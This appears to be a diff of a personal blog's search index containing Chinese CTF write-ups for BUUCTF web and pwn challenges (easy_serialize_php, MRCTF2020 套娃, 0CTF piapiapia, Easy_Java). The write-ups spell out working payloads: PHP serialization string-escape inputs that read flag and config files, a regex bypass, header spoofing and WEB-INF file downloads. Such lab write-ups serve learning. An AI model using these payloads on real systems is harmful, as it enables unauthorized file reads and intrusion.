&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>逃逸成了 </p>
-<p>“;s:48: 的变量名对应的值为1 </p>
-<p>​	-&gt; 注意的点<code>&quot;;s:</code>肯定有，48:是后面的值的长度</p>
-<p>​	-&gt; 第二个”是传入的值的前引号</p>
-<p>​	-&gt;我们需要自己构造的是闭合这个名字 <code>;</code></p>
-<p>img的变量名对应的值对 base64_encode(d0g3_f1ag.php)</p>
-<p>​	-&gt; 注意的点，闭合这个序列化 ;}</p>
-</blockquote>
-<p><strong>2.键值逃逸</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;flagflagflagflagflagphp&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>先将自己要写入的代码放进去 也就是$function的值</p>
-<p>-&gt;通过测试，一步步调整 user中的值 来闭合</p>
-</blockquote>
-<p><code>&quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</code></p>
-<p><code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> -&gt;这是23的长度，我们传入function中的值，开始要有一个”和; 来闭合前面user的值</p>
-<p><strong>payload:_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”1”;s:1:”2”;}</strong></p>
+<p>此时可以注意到url中是有这个filename参数的，且前面是Download -&gt; 下面对应的文件呗?</p>
+<p>但是并没有跳转下载链接, -&gt; 看别人的Wp说，将get方法改为post方法就能跳转下载链接了（不知道为什么）</p>
+<p><img src="/CTF/Web/BUU-Easy_Java/03.png"></p>
+<p>下载打开help.docx中并没有flag</p>
+<p><strong>结合题目信息 Java 以及上面的知识点</strong>  访问下载WEB-INF&#x2F;web.xml -&gt; </p>
+<p><img src="/CTF/Web/BUU-Easy_Java/04.png"></p>
+<p>再访问下载WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class</p>
+<p>打开之后发现一串base64编码的字符串，解码得到flag.</p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -340,6 +292,52 @@
       </tags>
   </entry>
   <entry>
+    <title>BUU-[MRCTF2020]套娃的Wp</title>
+    <url>/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/</url>
+    <content><![CDATA[<h2 id="BUU-MRCTF2020-套娃的记录"><a href="#BUU-MRCTF2020-套娃的记录" class="headerlink" title="BUU-[MRCTF2020]套娃的记录"></a>BUU-[MRCTF2020]套娃的记录</h2><p><strong>第一关：</strong></p>
+<ul>
+<li><input disabled type="checkbox"> 正则绕过 URL中特殊符号的转换</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>substr_count($query, ‘_’) 计算在$query字符串中<code>_</code>出现的次数</p>
+<p>preg_match(‘&#x2F;^23333$&#x2F;‘, $_GET[‘b_u_p_t’]) 正则匹配中<code>^</code>是开始的意思, <code>$</code>是结束的意思</p>
+</blockquote>
+<p>我们传的参数中不能存在<code>_</code> 和<code>%5f</code>&#x3D;&gt; 用空格代替（空格 . [ 都会被转换成_）</p>
+<p>正则匹配的绕过，结尾加上换行符的url编码<code>%0A</code></p>
+<p>payload1：<code>/?b u p t=23333%0A</code></p>
+<p><strong>访问下一个页面</strong>：</p>
+<ul>
+<li><input disabled type="checkbox"> 编码的特征认识</li>
+</ul>
+<p>源码中存在JSfuck编码，<a href="http://www.hiencode.com/jsfuck.html">解码</a>&#x3D;&gt; alert(“post me Merak” </p>
+<p>看Wp说也可以将JSfuck编码在控制台运行一下，也能够弹出</p>
+<blockquote>
+<p>alert()是js中的弹出函数</p>
+</blockquote>
+<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/00.png" alt="./"></p>
+<p><strong>回显出第三个页面：</strong></p>
+<ul>
+<li><input disabled type="checkbox"> 代码审计</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();	<span class="comment">// 这里没有getIp()函数，应该是在HTTP协议里面加一个头XFF头或者其他的（很多种）</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125; <span class="comment">// file_get_contents函数, 输出文件内容 flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>主要是根据<code>$re</code>的加密过程来反过来推出来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $re = &quot;flag.php&quot;;</span><br><span class="line">    $string=&#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($re);$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $string.=chr(ord($re[$i]) - 2*$i);</span><br><span class="line">    &#125;</span><br><span class="line">    echo base64_encode($string);</span><br></pre></td></tr></table></figure>
+
+<p>payload:<code>/secrettw.php?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code></p>
+<p>抓包 在HTTP头加一个<code>Client-ip: 127.0.0.1</code></p>
+<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/01.png"></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUU-easy_web的Wp</title>
     <url>/CTF/Web/BUU-easy_web/</url>
     <content><![CDATA[<p>打开题目，先抓包看看 -&gt; 两个参数img(base64编码) cmd 图片通过base64编码的格式进行传输.</p>
@@ -403,8 +401,195 @@
       </tags>
   </entry>
   <entry>
-    <title>Web</title>
-    <url>/CTF/Web/index/</url>
-    <content><![CDATA[]]></content>
+    <title>BUU-easy_serialize_php的Wp</title>
+    <url>/CTF/Web/BUU-easy_serialize_php/</url>
+    <content><![CDATA[<blockquote>
+<p>1.代码审计</p>
+<p>2.PHP反序列化</p>
+<p>3.反序列化中的对象逃逸</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>$function 变量 通过GET传f变量得到   &#x3D;&gt; 不同的值，对应不同的页面</p>
+<p> -&gt; 当f传入phpinfo , 可以得到提示 &#x3D;&gt; 一个文件的名字 d0g3_f1ag.php</p>
+<p> -&gt;当f传入show_image的时候存在file_get_contents函数 &#x3D;&gt; 可以读取文件内容</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>filter函数 &#x3D;&gt;过滤函数, 将一系列黑名单替换为空 &#x3D;&gt; 将$img变量中存在黑名单的内容替换为空</p>
+</blockquote>
+<p>-&gt; 以及serialize和unserialize两个序列化函数，想到键值对的逃逸</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment">// 以POST方法传入参数 =&gt; extract函数的作用是将post方法传入的键值对，以变量的形式返回</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="comment">// 将$_SESSION序列化后进行filter进行过滤，然后赋值给 $serialize_info变量</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>); <span class="comment">// 将$serialize_info变量进行反序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将$userinfo变量数组中img的值进行base64解码后进行文件的读取</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/CTF/Web/BUU-easy_serialize_php/test00.png"></p>
+<hr>
+<p><strong>如何去构造一个字符串逃逸</strong></p>
+<hr>
+<p><strong>1.键名逃逸</strong></p>
+<p>如何传入$_SESSION[phpflag] 序列化之后</p>
+<p>-&gt; s:7:”phpflag”:s:48:”” &#x3D;&gt; s:7:”<code>&quot;:s:48:&quot;</code>;”</p>
+<p>-&gt; 48是 传入phpflag的值的长度（即, $img对应的值）</p>
+<p>-&gt; 最后要进行序列化的闭合 <code>;&#125;</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">// s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>结合起来</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>逃逸成了 </p>
+<p>“;s:48: 的变量名对应的值为1 </p>
+<p>​	-&gt; 注意的点<code>&quot;;s:</code>肯定有，48:是后面的值的长度</p>
+<p>​	-&gt; 第二个”是传入的值的前引号</p>
+<p>​	-&gt;我们需要自己构造的是闭合这个名字 <code>;</code></p>
+<p>img的变量名对应的值对 base64_encode(d0g3_f1ag.php)</p>
+<p>​	-&gt; 注意的点，闭合这个序列化 ;}</p>
+</blockquote>
+<p><strong>2.键值逃逸</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;flagflagflagflagflagphp&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>先将自己要写入的代码放进去 也就是$function的值</p>
+<p>-&gt;通过测试，一步步调整 user中的值 来闭合</p>
+</blockquote>
+<p><code>&quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</code></p>
+<p><code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> -&gt;这是23的长度，我们传入function中的值，开始要有一个”和; 来闭合前面user的值</p>
+<p><strong>payload:_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”1”;s:1:”2”;}</strong></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU-[OCTF 2016]piapiapia的Wp</title>
+    <url>/CTF/Web/%5B0CTF%202016%5Dpiapiapia/</url>
+    <content><![CDATA[<h2 id="0CTF-2016-piapiapia记录"><a href="#0CTF-2016-piapiapia记录" class="headerlink" title="[0CTF 2016]piapiapia记录"></a>[0CTF 2016]piapiapia记录</h2><p>打开题目网址，登录页面，像是sql注入，但是没测试到注入，用sqlmap也没跑出来（post）。扫后面，我自己没扫到，看Wp说是有<a href="http://www.zip文件/">www.zip文件</a> </p>
+<p>-&gt; 访问并下载源码文件 -&gt; 用审计工具进行审计</p>
+<p>-&gt; 首先是有一个 register.php文件 &#x3D;&gt; 注册页面，那自己随便注册一下 登录之后 跳转到了update.php 即 文件上传页面</p>
+<p>-&gt; 经过测试，好像并没有文件上传漏洞</p>
+<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;00.png)</p>
+<p>进行代码审计：config.php文件中有<code>$flag</code>   那我们的目标的应该是读取config.php文件（<strong>文件读取漏洞</strong>）</p>
+<p><strong>profile.php文件中存在：</strong></p>
+<p>1.<code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> 很明显的文件读取函数</p>
+<p>2.<code>$profile = unserialize($profile);</code>这里还有一个反序列化函数</p>
+<p><strong>update.php文件中存在：</strong></p>
+<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;01.png)</p>
+<p>而update.php文件是我们上传文件的页面，$profile中的一些参数刚好对应上传文件页面的东西，最后还会进行序列化这个$profile</p>
+<p>最后调用了 update_profile函数</p>
+<p><strong>class.php文件中存在：</strong></p>
+<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;02.png)</p>
+<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;03.png)</p>
+<p>我们在update.php文件内传参，然后可以跳转到profile.php文件内</p>
+<p>在update.php内：class.php中user类的<code>update_profile($username, serialize($profile))</code> -&gt; 多次过滤，&#x3D;&gt; 调用父类mysql类的<code>parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);</code>  -&gt; 更新数据库中的数据 </p>
+<p>在profile.php内：<code>$profile=$user-&gt;show_profile($username);</code> &#x3D;&gt; class.php中user类的 show_profile()函数 -&gt; 过滤 &#x3D;&gt; 回来profile.php内， 反序列化，然后进行读取$profile[‘photo’]的值，但photo在update.php文件内 后面有个md5 </p>
+<p><code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code> 很明显无法直接传入</p>
+<p>-&gt; 有个过滤函数，还有序列化和反序列化，很容易想到 逃逸</p>
+<p>-&gt; 看一下过滤函数，有没有我们想要的 preg_match函数  </p>
+<blockquote>
+<p>$safe &#x3D; array(‘select’, ‘insert’, ‘update’, ‘delete’, ‘where’);<br>$safe &#x3D; ‘&#x2F;‘ . implode(‘|’, $safe) . ‘&#x2F;i’;<br>return preg_replace($safe, ‘hacker’, $string);</p>
+</blockquote>
+<p>where &#x3D;&gt; hacker   5 -&gt; 6 一个where可以换取一个字符，</p>
+<p>-&gt;很明显，我们可以将读取config.php的内容放在 photo前面的那个里面，通过preg_match函数来进行字符串逃逸.</p>
+<p>经过测试：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">        <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$profile</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;phone&#x27;</span> =&gt; <span class="string">&#x27;15839158474&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;158@qq.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;nickname&#x27;</span> =&gt; <span class="string">&#x27;&lt;?php  </span></span><br><span class="line"><span class="string">    function filter($string)&#123;</span></span><br><span class="line"><span class="string">        $safe = array(&#x27;</span>select<span class="string">&#x27;, &#x27;</span>insert<span class="string">&#x27;, &#x27;</span>update<span class="string">&#x27;, &#x27;</span>delete<span class="string">&#x27;, &#x27;</span>where<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">        $safe = &#x27;</span>/<span class="string">&#x27; . implode(&#x27;</span>|<span class="string">&#x27;, $safe) . &#x27;</span>/i<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">        return preg_replace($safe, &#x27;</span>hacker<span class="string">&#x27;, $string);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    $profile = array(</span></span><br><span class="line"><span class="string">        &#x27;</span>phone<span class="string">&#x27; =&gt; &#x27;</span><span class="number">15839158474</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;</span>email<span class="string">&#x27; =&gt; &#x27;</span><span class="number">158</span>@qq.com<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;</span>nickname<span class="string">&#x27; =&gt; &#x27;</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;photo&#x27; =&gt; &#x27;upload/21232f297a57a5a743894a0e4a801fc3&#x27;</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">    echo filter(serialize(<span class="subst">$profile</span>));&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;photo&#x27; =&gt; &#x27;upload/21232f297a57a5a743894a0e4a801fc3&#x27;</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">    echo filter(serialize(<span class="subst">$profile</span>));</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p>
+<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;05.png)</p>
+<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;06.png)</p>
+<p>![07](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;07.png)</p>
+<h4 id="收获的知识点："><a href="#收获的知识点：" class="headerlink" title="收获的知识点："></a>收获的知识点：</h4><p><strong>1.代码审计能力 初步会使用代码审计软件，将这么多的代码之间的关系理清了七七八八</strong></p>
+<p><strong>2.反序列化字符串逃逸的构造能力。（1.闭合 2.调试）</strong></p>
+<p><strong>3.文件上传漏洞：并不是能上传成功就说明有这个漏洞，</strong></p>
+<p><strong>-&gt;我们需要能够去访问那个上传之后在的路径，</strong></p>
+<p><strong>-&gt;并且上传的文件能够被Web容器解释执行（php被Aapche容器执行）,所以文件上传后所在的目录必须是Web容器能够覆盖到的</strong></p>
+<hr>
+<p>参考：<a href="https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/">https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/</a></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU-[HNCTF 2022 Week1]fmtstrre的Wp</title>
+    <url>/CTF/Pwn/%5BHNCTF%202022%20Week1%5Dfmtstrre/</url>
+    <content><![CDATA[<p>先checksec一下</p>
+<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;00.png)</p>
+<p>然后IDA(64)打开</p>
+<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;01.png)</p>
+<blockquote>
+<p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
+<p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
+<p>将name的地址赋值给v5</p>
+<p>再向buf中写入256字节数据</p>
+</blockquote>
+<p>格式化字符串漏洞点 <code>printf(buf)</code></p>
+<p>这段代码中需要打开flag这个文件 &#x3D;l&gt; 小技巧</p>
+<p>-&gt; 在当前目录下创建一个flag文件，并输入一些东西，可以帮助我们观察其在栈上的位置。</p>
+<p>-&gt;当然,这个文件不是必须的.</p>
+<p>该如何利用这个漏洞？根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
+<p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
+<p><strong>参考<a href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html</a></strong></p>
+<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;02.png)</p>
+<blockquote>
+<p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
+</blockquote>
